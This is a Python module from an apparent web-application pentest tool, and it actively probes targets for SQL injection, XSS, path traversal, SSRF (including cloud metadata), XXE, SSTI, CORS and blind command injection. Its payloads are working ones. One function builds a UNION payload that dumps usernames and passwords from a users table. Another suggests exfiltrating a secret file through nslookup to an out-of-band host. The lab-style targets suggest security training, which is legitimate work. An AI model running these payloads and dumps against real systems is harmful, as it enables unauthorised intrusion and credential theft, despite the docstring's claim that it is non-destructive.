"""Active confirmation — the thing that was missing.

Given a candidate and a live scoped session, fire a few SAFE differential probes
and return a verdict. This is what turns "SQLi somewhere in search" into
"CONFIRMED: SearchTerm on /search_res is boolean-injectable" — no guessing,
no 20 rounds of hand-testing.

Everything here is non-destructive: a single quote, a true/false boolean pair,
a benign reflection canary, an OOB ping. No UNION dumps, no writes, no deletes.
Exploitation stays manual / lab-mode.
"""
from __future__ import annotations

import re
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from .models import Candidate, Confidence, Transaction
from .tailor import pick_param, context


class Verdict:
    def __init__(self, ok: bool, label: str, detail: str = ""):
        self.ok = ok
        self.label = label        # short line for the board
        self.detail = detail      # longer explanation

    def as_note(self) -> str:
        head = ("CONFIRMED: " if self.ok else "inconclusive: ") + self.label
        return head + (("  —  " + self.detail) if self.detail else "")


def _with_param(txn: Transaction, param: str, value: str) -> str:
    pr = urlparse(txn.url)
    q = parse_qs(pr.query, keep_blank_values=True)
    q[param] = [value]
    newq = urlencode({k: v[0] for k, v in q.items()}, safe="%")
    return urlunparse(pr._replace(query=newq))


def _fetch(session, method, url, txn, note=""):
    # replay with the original cookies/headers so auth + context are preserved
    headers = {k: v for k, v in txn.req_headers.items()
               if k.lower() not in ("content-length", "host")}
    return session.fetch(method, url, headers=headers, note=note)


def _norm_len(t) -> int:
    return len(t.resp_body or "") if t else -1


def _similar(a: str, b: str) -> float:
    """cheap body-similarity 0..1 by length ratio + shared line fraction."""
    if a is None or b is None:
        return 0.0
    la, lb = len(a), len(b)
    if la == 0 and lb == 0:
        return 1.0
    ratio = min(la, lb) / max(la, lb, 1)
    return ratio


_SQL_ERR = re.compile(
    r"SQL syntax|SQLSTATE|ORA-\d{4,}|PG::|psql|unterminated|unclosed quotation|"
    r"syntax error at or near|quoted string not properly terminated|"
    r"you have an error in your sql", re.I)


def confirm_sqli(session, txn: Transaction, param: str) -> Verdict:
    base = _fetch(session, txn.method, txn.url, txn)
    if base is None or base.status is None:
        return Verdict(False, "could not fetch baseline")

    # 1) error-based: a single quote provokes a DB error
    q_url = _with_param(txn, param, (_orig(txn, param) or "x") + "'")
    rq = _fetch(session, txn.method, q_url, txn)
    if rq and _SQL_ERR.search(rq.resp_body or ""):
        return Verdict(True, f"error-based SQLi on '{param}'",
                       "a single quote returns a database error string")

    # 2) boolean-based: TRUE ~ baseline, FALSE differs
    t_url = _with_param(txn, param, (_orig(txn, param) or "x") + "' AND '1'='1")
    f_url = _with_param(txn, param, (_orig(txn, param) or "x") + "' AND '1'='2")
    rt = _fetch(session, txn.method, t_url, txn)
    rf = _fetch(session, txn.method, f_url, txn)
    if rt and rf:
        sim_tb = _similar(rt.resp_body, base.resp_body)
        sim_tf = _similar(rt.resp_body, rf.resp_body)
        # TRUE close to baseline, FALSE clearly different => boolean oracle
        if sim_tb > 0.9 and sim_tf < 0.85 and _norm_len(rt) != _norm_len(rf):
            return Verdict(True, f"boolean-based SQLi on '{param}'",
                           f"TRUE matches baseline ({_norm_len(rt)}B), "
                           f"FALSE differs ({_norm_len(rf)}B)")

    # 3) time-based blind: no error, no boolean diff — inject a DB sleep and see
    #    if the response is delayed. Tries the big-3 engines' sleep syntax.
    delay = _SQLI_DELAY
    o = _orig(txn, param) or "x"
    t0 = time.time()
    _fetch(session, txn.method, _with_param(txn, param, o), txn, note="sqli time baseline")
    base_dt = time.time() - t0
    for payload, eng in (
        (f"'||pg_sleep({delay})--", "PostgreSQL"),
        (f"' AND SLEEP({delay})-- -", "MySQL"),
        (f"'; WAITFOR DELAY '0:0:{delay}'--", "MSSQL"),
        (f"' AND 1=(SELECT 1 FROM PG_SLEEP({delay}))--", "PostgreSQL"),
    ):
        t1 = time.time()
        r = _fetch(session, txn.method, _with_param(txn, param, o + payload), txn,
                   note="sqli time probe")
        dt = time.time() - t1
        if r is not None and dt - base_dt >= delay * 0.5:
            return Verdict(True, f"time-based blind SQLi on '{param}' ({eng})",
                           f"'{payload}' delayed the response {dt:.1f}s vs {base_dt:.1f}s baseline "
                           f"— confirmed. Extract data with a boolean/substring + conditional sleep.")

    # 4) quote changes result-set size notably (weaker signal)
    if rq and abs(_norm_len(rq) - _norm_len(base)) > 50:
        return Verdict(False, f"'{param}' reacts to a quote (possible SQLi)",
                       f"baseline {_norm_len(base)}B vs quote {_norm_len(rq)}B — "
                       f"try the UNION/boolean payloads to confirm")
    return Verdict(False, f"'{param}' did not react to injection probes")


_SQLI_DELAY = 10   # seconds for the time-based probe; benchmark lowers it


def build_union(session, txn: Transaction, param: str) -> dict | None:
    """After SQLi is confirmed, auto-find column count + text columns and build
    the ready UNION dump. Combined search: for each column count, probe each
    position with a string marker; the count where a marker reflects is real.
    Returns {columns, text_columns, payload, note} or None."""
    orig = _orig(txn, param) or "x"
    marker = "wQ7zx1"
    cols = None
    text_cols: list[int] = []
    for n in range(1, 9):                     # up to 8 columns
        found = []
        for i in range(1, n + 1):
            sel = ",".join(f"'{marker}'" if j == i else "NULL" for j in range(1, n + 1))
            url = _with_param(txn, param, f"{orig}' UNION SELECT {sel}-- -")
            r = _fetch(session, txn.method, url, txn, note=f"sqli union {n}col pos{i}")
            if r and marker in (r.resp_body or ""):
                found.append(i)
        if found:
            cols, text_cols = n, found
            break
    if not cols:
        return None
    # build the dump: username + password into text columns
    if len(text_cols) >= 2:
        sel = []
        for j in range(1, cols + 1):
            sel.append("username" if j == text_cols[0]
                       else "password" if j == text_cols[1] else "NULL")
        dump = ",".join(sel)
    else:
        tc = text_cols[0]
        dump = ",".join("username||':'||password" if j == tc else "NULL"
                        for j in range(1, cols + 1))
    payload = _with_param(txn, param, f"{orig}' UNION SELECT {dump} FROM users-- -")
    note = (f"{cols} columns, text column(s) {text_cols}. "
            f"If 'users'/'username'/'password' are named differently, adjust.")
    return {"columns": cols, "text_columns": text_cols, "payload": payload, "note": note}


def confirm_reflection(session, txn: Transaction, param: str) -> Verdict:
    cid = "waptZz9"
    # probe with special chars so we can tell a RAW reflection (injectable) from
    # an HTML-ENCODED one (safe). A plain canary can't — it reflects either way.
    probe = cid + '"<svg>'
    r = _fetch(session, txn.method, _with_param(txn, param, probe), txn,
               note="xss reflection canary")
    if r is None:
        return Verdict(False, "could not fetch")
    body = r.resp_body or ""
    ct = (r.resp_headers.get("Content-Type") or r.header("content-type") or "").lower()
    if cid not in body:
        return Verdict(False, f"'{param}' not reflected")
    i = body.find(cid)
    seg = body[max(0, i-50):i+80]
    raw = "<svg>" in seg or (cid + '"' in seg and "&quot;" not in seg)
    encoded = ("&lt;" in seg or "&quot;" in seg or "&gt;" in seg) and "<svg>" not in seg
    if encoded or not raw:
        return Verdict(False, f"'{param}' reflected but HTML-encoded (safe)",
                       "special chars come back escaped — not exploitable here")
    if "json" in ct:
        return Verdict(True, f"reflected XSS on '{param}' — JavaScript/JSON (eval) sink",
                       'your text lands inside JS/JSON — use payload (c) "-alert(1)}// , '
                       "then the eval-sink cookie theft. (NOT the <img> ones.)")
    # HTML comment context: an unclosed <!-- sits before the canary
    before = body[:i]
    if before.rfind("<!--") > before.rfind("-->"):
        return Verdict(True, f"reflected XSS on '{param}' — HTML comment context",
                       "close the comment first:  --><svg onload=alert(1)>")
    # JavaScript string context: canary sits inside a <script> block
    if re.search(r"<script[^>]*>(?:(?!</script>).)*?" + cid, body, re.I | re.S):
        pre = body[max(0, i - 60):i]
        q = "'" if pre.rfind("'") > pre.rfind('"') else '"'
        return Verdict(True, f"reflected XSS on '{param}' — JavaScript string context",
                       f"break OUT of the JS string with  {q}-alert(1)//  — an <img> tag "
                       "won't run inside a quoted string.")
    if re.search(r'=["\'][^"\']*' + cid, seg):
        return Verdict(True, f"reflected XSS on '{param}' — attribute context",
                       'your text is inside a tag attribute — use payload (b) "><img ...>')
    return Verdict(True, f"reflected XSS on '{param}' — HTML context",
                   "your text lands in page HTML — use payload (a) <img src=1 onerror=alert(1)>")


def confirm_traversal(session, txn: Transaction, param: str) -> Verdict:
    """Read a known file (/etc/passwd) via the param and look for its signature."""
    base = _fetch(session, txn.method, txn.url, txn)
    base_body = (base.resp_body if base else "") or ""
    for payload in ("../../../../../../etc/passwd", "/etc/passwd",
                    "....//....//....//....//etc/passwd",
                    "..%2f..%2f..%2f..%2f..%2fetc/passwd"):
        r = _fetch(session, txn.method, _with_param(txn, param, payload), txn,
                   note="traversal probe")
        body = (r.resp_body if r else "") or ""
        if re.search(r"root:.*:0:0:", body) and "root:" not in base_body:
            return Verdict(True, f"path traversal on '{param}'",
                           f"read /etc/passwd via  {payload}  — swap in /home/carlos/secret")
    return Verdict(False, f"'{param}' did not traverse",
                   "try the double-encoded / null-byte variants in the card")


def confirm_ssrf(session, txn: Transaction, param: str, collab: str) -> Verdict:
    """Prefer a self-verifying file/internal read; fall back to an OOB ping."""
    base = _fetch(session, txn.method, txn.url, txn)
    base_body = (base.resp_body if base else "") or ""
    for payload, sig in (("file:///etc/passwd", r"root:.*:0:0:"),
                         ("http://localhost/", None),
                         ("http://169.254.169.254/latest/meta-data/", None)):
        r = _fetch(session, txn.method, _with_param(txn, param, payload), txn, note="ssrf probe")
        body = (r.resp_body if r else "") or ""
        if sig and re.search(sig, body) and "root:" not in base_body:
            return Verdict(True, f"SSRF on '{param}' (file read)",
                           f"read a local file via  {payload}")
        if not sig and r and r.status and r.status < 500 and body and body != base_body \
                and len(body) != len(base_body):
            return Verdict(True, f"SSRF on '{param}' (reaches internal services)",
                           f"internal response differs from baseline via  {payload}")
    # couldn't self-verify -> OOB
    return confirm_oob(session, txn, param, collab)


def confirm_xxe(session, txn: Transaction, collab: str) -> Verdict:
    """Try in-band XXE (expand /etc/passwd into a reflected element). Blind XXE
    needs an external DTD + Collaborator, which we can't self-verify here."""
    body = ('<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            '<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>')
    headers = {k: v for k, v in txn.req_headers.items()
               if k.lower() not in ("content-length", "host")}
    headers["Content-Type"] = "application/xml"
    r = session.fetch("POST", txn.url, headers=headers, body=body, note="xxe in-band probe")
    if r and re.search(r"root:.*:0:0:", r.resp_body or ""):
        return Verdict(True, "XXE (in-band file read)",
                       "an external entity expanded /etc/passwd into the response — swap in /home/carlos/secret")
    return Verdict(False, "XXE not confirmed in-band",
                   "if blind, host a malicious external DTD and exfil to Collaborator (card has the payload)")


def confirm_ssti(session, txn: Transaction, param: str) -> Verdict:
    """Safe, self-verifying: send 7*7 in each engine's syntax, wrapped in unique
    markers, and see which one renders 49. Arithmetic only — no RCE probe."""
    probes = [
        ("Jinja2/Twig ( {{…}} )", "wZ{{7*7}}Zw", "wZ49Zw"),
        ("Java EL / Smarty ( ${…} )", "wZ${7*7}Zw", "wZ49Zw"),
        ("Ruby / Thymeleaf ( #{…} )", "wZ#{7*7}Zw", "wZ49Zw"),
        ("ERB / Freemarker ( <%= … %> )", "wZ<%= 7*7 %>Zw", "wZ49Zw"),
    ]
    reflected_raw = False
    for engine, payload, expect in probes:
        r = _fetch(session, txn.method, _with_param(txn, param, payload), txn,
                   note="ssti arithmetic probe")
        body = (r.resp_body if r else "") or ""
        if expect in body:
            return Verdict(True, f"SSTI on '{param}' — {engine}",
                           f"7*7 rendered as 49 — the engine looks like {engine}. "
                           "Use the matching RCE row to read /home/carlos/secret.")
        if "wZ7*7Zw" in body or "wZ" in body:
            reflected_raw = True
    if reflected_raw:
        return Verdict(False, f"'{param}' reflects input but did NOT evaluate 7*7 (not SSTI here)",
                       "the expression came back as literal text — likely plain reflection, check XSS instead")
    return Verdict(False, f"'{param}' did not evaluate a template expression")


def confirm_cors(session, txn: Transaction, collab: str = "") -> Verdict:
    """Self-verifying from headers: re-request with an attacker-controlled Origin
    and see whether the server reflects THAT origin with Allow-Credentials:true.
    A whitelisted-only app (reflects just its own origin) is correctly rejected."""
    path = urlparse(txn.url).path or "/"
    headers = {k: v for k, v in txn.req_headers.items()
               if k.lower() not in ("content-length", "host", "origin")}

    def probe(origin):
        h = dict(headers); h["Origin"] = origin
        r = session.fetch(txn.method, txn.url, headers=h, note=f"cors origin probe {origin}")
        acao = (r.header("access-control-allow-origin") if r else "") or ""
        acac = ((r.header("access-control-allow-credentials") if r else "") or "").lower()
        return acao, acac

    evil = "https://wapt-attacker.example"
    acao, acac = probe(evil)
    if acao == evil and acac == "true":
        return Verdict(True, f"CORS on {path} — arbitrary Origin reflected with credentials",
                       "the server echoed an attacker Origin with Allow-Credentials:true — "
                       "a page on any origin can read this response using the victim's cookies")
    nacao, nacac = probe("null")
    if nacao == "null" and nacac == "true":
        return Verdict(True, f"CORS on {path} — 'null' Origin trusted with credentials",
                       "host your exploit in a sandboxed iframe (Origin: null) to read the response")
    if acao:
        return Verdict(False, f"'{path}' reflects only specific origins (not arbitrary) — not cross-site exploitable",
                       f"attacker Origin was not echoed (got ACAO:{acao or 'none'})")
    return Verdict(False, f"'{path}' did not reflect the attacker Origin")


# blind-cmdi time probe: production uses a 10s sleep; the benchmark lowers this
# for speed. Threshold is half the delay, so jitter can't trip a false positive.
_CMDI_DELAY = 10
_CMDI_SEPS = (";sleep {d};", "|sleep {d}|", "`sleep {d}`")


def confirm_cmdi(session, txn: Transaction, param: str, collab: str) -> Verdict:
    """Confirm blind OS command injection by TIMING: inject `sleep N` and see if
    the response is delayed by ~N relative to a baseline. Falls back to an OOB
    ping (which needs Collaborator) when timing shows nothing."""
    delay = _CMDI_DELAY
    orig = _orig(txn, param) or "x"
    t0 = time.time()
    _fetch(session, txn.method, _with_param(txn, param, orig), txn, note="cmdi baseline")
    base_dt = time.time() - t0
    for sep in _CMDI_SEPS:
        inj = orig + sep.format(d=delay)
        t1 = time.time()
        r = _fetch(session, txn.method, _with_param(txn, param, inj), txn, note="cmdi time probe")
        dt = time.time() - t1
        if r is not None and dt - base_dt >= delay * 0.5:
            return Verdict(True, f"blind OS command injection on '{param}' — time-based",
                           f"'{sep.format(d=delay)}' delayed the response {dt:.1f}s vs "
                           f"{base_dt:.1f}s baseline — the shell ran your command. "
                           f"Swap  sleep  for  nslookup $(cat /home/carlos/secret).{collab or 'YOUR-COLLAB'}  to exfil.")
    # no timing signal → out-of-band ping (operator must poll Collaborator)
    return confirm_oob(session, txn, param, collab)


def confirm_oob(session, txn: Transaction, param: str, collab: str) -> Verdict:
    """Fire an OOB ping; we can't poll Collaborator from here, so this just
    sends the probe and tells the operator to check their Collaborator."""
    if not collab:
        return Verdict(False, "no Collaborator configured")
    payload = f"https://{collab}/wapt-oob"
    _fetch(session, txn.method, _with_param(txn, param, payload), txn)
    return Verdict(False, f"OOB probe sent via '{param}'",
                   f"check Collaborator for a hit from {collab} — a hit = confirmed SSRF/OOB")


def _orig(txn: Transaction, param: str) -> str:
    q = parse_qs(urlparse(txn.url).query, keep_blank_values=True)
    return q.get(param, [""])[0]


# dispatcher
def confirm_candidate(session, cand: Candidate, collab: str = "") -> Verdict:
    txn = cand.signals[0].txn if cand.signals else None
    if txn is None:
        return Verdict(False, "no captured request to replay")
    _, _, params = context(txn)
    param = cand.param or pick_param(params)
    cls = cand.vuln_class
    try:
        if cls == "sql-injection":
            return confirm_sqli(session, txn, param)
        if cls in ("reflected-stored-xss", "dom-xss"):
            return confirm_reflection(session, txn, param)
        if cls == "path-traversal":
            return confirm_traversal(session, txn, param)
        if cls == "ssrf":
            return confirm_ssrf(session, txn, param, collab)
        if cls == "cors-exfil":
            return confirm_cors(session, txn, collab)
        if cls == "ssti":
            return confirm_ssti(session, txn, param)
        if cls == "xxe":
            return confirm_xxe(session, txn, collab)
        if cls == "os-command-injection":
            return confirm_cmdi(session, txn, param, collab)
        return Verdict(False, f"no active probe for {cls} yet (manual confirm)")
    except Exception as e:
        return Verdict(False, f"probe error: {e}")
